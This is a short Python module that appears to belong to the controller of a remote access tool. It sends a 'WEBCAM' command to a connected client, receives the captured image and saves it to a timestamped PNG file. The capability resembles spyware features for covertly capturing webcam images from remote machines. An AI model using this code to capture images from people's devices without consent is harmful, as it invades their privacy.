""" Webcam functionality """
import logging
from datetime import datetime
from typing import Union, Optional

from modules.clients import Client
from utils.timeout_handler import timeoutsetter


def webcam(client: Client, filename: Optional[str] = None, timeout: Union[float, None] = 120.0) -> str:
    """ Capture webcam """
    logging.debug('Capturing webcam (%s)', client.port)
    client.write(b'WEBCAM')

    with timeoutsetter(client, timeout):
        img_data = client.read()

    if img_data == b'ERROR':
        logging.error('Unable to capture webcam (%s)', client.port)
        raise RuntimeError('Unable to capture webcam')

    if filename is None:
        filename = f'webcam-{datetime.now()}.png'.replace(':', '-')

    with open(filename, 'wb') as file:
        file.write(img_data)
    logging.info('Saved webcam capture at (%s): %s', client.port, filename)
    return filename
